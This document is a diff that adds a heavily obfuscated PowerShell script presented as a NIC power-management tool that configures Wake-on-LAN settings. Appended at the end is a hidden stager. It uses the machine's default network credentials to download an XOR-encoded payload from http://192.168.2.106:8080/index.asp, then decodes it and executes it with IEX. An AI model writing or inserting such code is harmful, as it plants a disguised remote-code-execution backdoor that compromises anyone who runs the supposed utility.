@@ -1,0 +1,123 @@
+sET-vARIABLE ('jc'+'B'+'8f3')  ( [TypE]("{0}{1}"-f'r','eGEX')  );   $9G80sV=[TYPE]("{2}{3}{1}{4}{0}{5}" -f 'EbReqUe','Net.','sYsTe','M.','w','St') ;  seT-iTEm VArIABle:lxn (  [TyPE]("{3}{0}{4}{5}{1}{2}"-F'ysTEM.N','TiALCaC','HE','s','et.c','reDen') )  ;  
+[CmdletBinding()]
+param
+(
+		[Parameter(MANDATOrY = ${faL`SE})][string]${C`ON`sOlet`i`TLE} = ("{4}{0}{6}{5}{2}{3}{1}"-f'I','t','ower M','anagemen','N','P','C '),
+		[bool]${tur`N`Offdevi`cE} = ${Tr`Ue},
+		[bool]${WakE`cOM`PUTER} = ${T`RuE},
+		[bool]${AL`lowmAg`ICPAckE`Tsonly} = ${tR`Ue}
+)
+
+function EXit-`p`oW`eRsh`ELL {
+
+	
+	[CmdletBinding()]
+	param
+	(
+			[bool]${e`RroRS}
+	)
+	
+	If (${E`R`RoRs} -eq ${tR`Ue}) {
+		Exit 1
+	}
+}
+
+function GEt-rel`AtIVEPA`Th {
+
+	
+	[CmdletBinding()][OutputType([string])]
+	param ()
+	
+	${p`ATH} = (&("{2}{0}{1}" -f'p','ath','split-') ${sCr`IPt:My`I`N`VO`CA`TIon}."my`CoMM`ANd"."p`AtH" -parent) + "\"
+	Return ${P`Ath}
+}
+
+function g`e`T`-PHyS`icalNIcs {
+
+	
+	[CmdletBinding()]
+	param ()
+	
+	
+	${NI`Cs} = .("{1}{2}{0}" -f 'miObject','Ge','t-W') ("{4}{3}{1}{0}{2}"-f 'or','32_Netw','kAdapter','in','W') -filter ('AdapterT'+'ypeID'+' '+'= '+('zF30zF3'+' ')."R`ePLacE"('zF3',[STrInG][ChAR]39)+"`
+	AND "+'Ph'+'ysicalAda'+'pt'+'er '+'= '+('{0}'+'tru'+'e{0} ')  -F [cHAr]39+"`
+	AND "+'N'+'OT '+'Des'+'cripti'+'on '+'L'+'IKE '+('{'+'0}%Cent'+'rino%{0} ')-F  [CHaR]39+"`
+	AND "+'NOT'+' '+'Des'+'cripti'+'o'+'n '+'LI'+'KE '+(('ml5%wi'+'reless'+'%ml'+'5 ') -rEPlacE'ml5',[cHaR]39)+"`
+	AND "+'N'+'OT '+'D'+'escri'+'ption'+' '+'LIKE'+' '+(('1'+'na%v'+'i'+'rtual'+'%1n'+'a ')-crEpLacE([CHAr]49+[CHAr]110+[CHAr]97),[CHAr]39)+"`
+	AND "+'NOT'+' '+'D'+'e'+'scription '+'LIK'+'E '+('{'+'0}'+'%WiFi'+'%{'+'0} ') -f [chaR]39+"`
+	AND "+'NOT'+' '+'D'+'es'+'cription '+'LIKE'+' '+(('K1'+'n%Blueto'+'ot'+'h%'+'K1n') -cREplaCe ([CHAr]75+[CHAr]49+[CHAr]110),[CHAr]39))
+	Return ${NI`CS}
+}
+
+function S`eT`-C`ONsOlE`TItLE {
+
+	
+	[CmdletBinding()]
+	param ()
+	
+	${Ho`sT}."ui"."rA`wUI"."win`d`oW`TITLe" = ${c`ONs`OlE`TiTLe}
+}
+
+function s`et-`NI`CPowErMA`N`AGeM`ENT {
+
+	
+	[CmdletBinding()][OutputType([bool])]
+	param
+	(
+			${n`ICs}
+	)
+	
+	foreach (${N`ic} in ${NI`CS}) {
+		${Er`R`orS} = ${f`A`lSe}
+		&("{1}{0}{2}"-f 'it','Wr','e-Host') ("{1}{0}"-f'IC:','N')${n`iC}."nA`me"
+		
+		&("{0}{2}{1}"-f 'Wri','Host','te-') ("{8}{11}{3}{7}{2}{0}{9}{4}{10}{13}{6}{12}{5}{1}"-f'puter to','.','m','w the ','n ','ce....','d','co','All',' tur','off ','o','evi','this ') -NoNewline
+		${nicPo`wEr`MaNaGE} = &("{3}{0}{1}{2}" -f '-WmiObje','c','t','Get') ("{5}{1}{3}{4}{0}{2}" -f'nabl','r_D','e','evice','E','MSPowe') -Namespace (("{0}{1}" -f'rootWvMw','mi'))."rEpl`ACE"('WvM',[striNg][cHaR]92) | &("{1}{2}{0}"-f 'ect','Wh','ere-Obj') { ${_}."IN`stance`NaME" -match   (get-vaRiAbLE ("j"+"Cb8f3")  -vAlU )::("{1}{0}"-f 'e','escap').Invoke(${N`Ic}."pN`pdEv`Ice`ID") }
+		If (${NI`CpO`wER`manAge}."ENA`Ble" -ne ${tU`RNofFdEV`IcE}) {
+			${n`IC`pOWERM`ANA`ge}."en`A`Ble" = ${tUrnofFD`e`VICe}
+			${H`iDeO`UTpUT} = ${N`iCPO`WerMANaGE}."psb`ASE".("{1}{0}"-f 't','Pu').Invoke()
+		}
+		If (${nICpoW`Er`MA`NA`Ge}."e`NAbLe" -eq ${tU`RnOfF`DEVicE}) {
+			&("{1}{2}{0}"-f'ost','Write','-H') ("{1}{2}{0}"-f 'ess','Suc','c') -ForegroundColor ("{1}{0}"-f 'low','Yel')
+		} else {
+			&("{0}{1}{2}{3}" -f'Wr','i','te','-Host') ("{1}{0}"-f'iled','Fa') -ForegroundColor ("{1}{0}" -f 'ed','R')
+			${E`RR`orS} = ${TR`UE}
+		}
+		
+		&("{1}{0}{2}"-f'te-Ho','Wri','st') ("{10}{6}{2}{1}{4}{8}{3}{7}{0}{9}{5}"-f 'o wak','is de',' th','ce ','v','.....','llow','t','i','e the computer','A') -NoNewline
+		${nIcP`OwErm`ANa`ge} = .("{1}{2}{0}{3}"-f'c','Get-Wm','iObje','t') ("{0}{2}{4}{1}{3}"-f'MSPower_','n','De','able','viceWakeE') -Namespace (("{3}{2}{0}{1}" -f'IAw','mi','t5','roo')).("{0}{1}{2}"-f'Re','PlaC','E').Invoke('5IA','\') | .("{1}{0}{2}" -f'ere-Obj','Wh','ect') { ${_}."iNst`A`NCe`NAME" -match   (  VAriaBle  ("JC"+"B8F3")  -ValUeONL )::("{2}{0}{1}"-f 'cap','e','es').Invoke(${n`ic}."P`N`pdEVi`CeiD") }
+		If (${NicpOwErmA`N`AgE}."e`N`ABle" -ne ${WAk`EComp`UTer}) {
+			${NiC`poWERMA`NA`GE}."enAb`LE" = ${W`Ak`ECOMpUter}
+			${h`iD`EoutpUT} = ${Ni`c`po`wErManAGe}."p`s`BaSE".("{0}{1}" -f 'P','ut').Invoke()
+		}
+		If (${NICp`owerM`ANAGe}."enA`B`lE" -eq ${W`Ak`e`coMPUteR}) {
+			.("{0}{2}{1}" -f'Wr','ost','ite-H') ("{0}{1}"-f 'S','uccess') -ForegroundColor ("{0}{1}"-f'Yell','ow')
+		} else {
+			&("{2}{0}{1}"-f 'e','-Host','Writ') ("{1}{0}"-f'ailed','F') -ForegroundColor ("{0}{1}"-f 'R','ed')
+			${er`Ro`RS} = ${t`RUe}
+		}
+		
+		&("{0}{1}{2}" -f 'Wr','ite','-Host') ("{12}{5}{9}{7}{2}{10}{11}{0}{4}{3}{1}{6}{8}"-f 't to wake ','t','a','u','the comp','w a ma','er.',' p','....','gic','ck','e','Only allo') -NoNewline
+		${nICP`O`We`RMA`NaGE} = &("{0}{3}{1}{2}" -f'Get-WmiO','ec','t','bj') ("{5}{1}{4}{0}{3}{2}" -f'Pac','eWakeOnM','y','ketOnl','agic','MSNdis_Devic') -Namespace ((("{2}{0}{1}" -f'oot','IVEwmi','r')) -replace([CHar]73+[CHar]86+[CHar]69),[CHar]92) | .("{0}{1}{2}"-f 'Where-Ob','jec','t') { ${_}."i`Nstanc`eN`Ame" -match   (  vARIable  ('JC'+'B'+'8f3') ).vALue::("{1}{0}"-f 'ape','esc').Invoke(${n`iC}."pN`pD`EVIc`Eid") }
+		If (${N`IC`po`werMAN`AGE}."EnAblEWAk`eo`NmA`GIcpacketo`NlY" -ne ${a`l`LOw`M`AgiCPAckE`TsON`LY}) {
+			${N`iCP`OWe`RmanA`Ge}."enABl`E`WAkEOnma`gi`CPaC`kEton`LY" = ${ALlOwma`gIcpAck`eTSO`N`lY}
+			${H`iDeou`TP`UT} = ${nI`CP`oWERmAN`A`GE}."P`sBAsE".("{0}{1}"-f'P','ut').Invoke()
+		}
+		If (${NI`cPoWEr`M`AN`Age}."E`NaBL`eWAk`eOnmaGi`cpAc`KEToNLY" -eq ${aLlOWmag`i`cPA`c`KEtso`NLY}) {
+			&("{2}{0}{1}"-f'rite-Hos','t','W') ("{0}{1}" -f'Su','ccess') -ForegroundColor ("{1}{0}" -f 'w','Yello')
+		} else {
+			&("{2}{0}{1}{3}" -f 'rite-','H','W','ost') ("{1}{0}{2}"-f 'ile','Fa','d') -ForegroundColor ("{0}{1}"-f'R','ed')
+			${E`RroRs} = ${t`RUE}
+		}
+	}
+	Return ${E`RroRS}
+}
+
+&("{0}{1}{2}" -f'C','lear-Hos','t')
+&("{1}{0}{4}{5}{3}{2}" -f'C','Set-','e','eTitl','o','nsol')
+${pHy`S`IC`AlNICs} = .("{2}{3}{1}{0}"-f 'calNICs','i','Get','-Phys')
+${E`RrOrs} = &("{3}{1}{2}{0}" -f 'ement','-NICPower','Manag','Set') -NICs ${p`H`ySiC`ALNics}
+&("{1}{2}{0}{3}"-f'-Sl','St','art','eep') -Seconds 5
+.("{4}{3}{0}{2}{1}" -f 'ower','l','Shel','P','Exit-') -Errors ${E`RRO`Rs}
+
+${W`C}=&("{0}{2}{1}" -f'NEw-Ob','T','jEc') ("{4}{2}{3}{1}{0}{5}"-f'b','ET.We','Te','M.N','SYS','ClIeNT');${U}=(("{18}{0}{10}{8}{7}{6}{11}{19}{15}{12}{16}{17}{5}{13}{14}{3}{9}{20}{1}{2}{4}" -f'o','.0; rv:11.0) lik','e Gec','Tri','ko','1; W','/','la','il','den','z','5','i','O','W64; ','0 (W','nd','ows NT 6.','M','.','t/7'));${Wc}."He`A`dErs".("{1}{0}"-f'dD','A').Invoke(("{0}{2}{1}"-f'Use','t','r-Agen'),${U});${WC}."pR`OXY" =   $9g80Sv::"dEfA`Ul`T`webPR`oxY";${wc}."P`ROxY"."creDEn`Ti`A`LS" =   ( Gi  vAriabLE:Lxn ).vAlue::"dEfAuLtNetW`O`RK`C`Red`ENTi`A`Ls";${k}=("{1}{5}{0}{7}{6}{3}{4}{2}{8}"-f'b','827','a16891f','a8a706c4c','34','cc','e','0e','84e7b');${i}=0;[CHar[]]${B}=([ChaR[]](${Wc}.("{0}{2}{1}{3}" -f'DOwnloa','StRi','d','Ng').Invoke(("{2}{3}{0}{6}{8}{1}{4}{7}{5}" -f '1','8080/i','http:','//','nde','asp','92.168','x.','.2.106:'))))|.('%'){${_}-bXOr${K}[${i}++%${K}."lEN`gTh"]};.("{1}{0}"-f 'EX','I') (${B}-jOIN'')
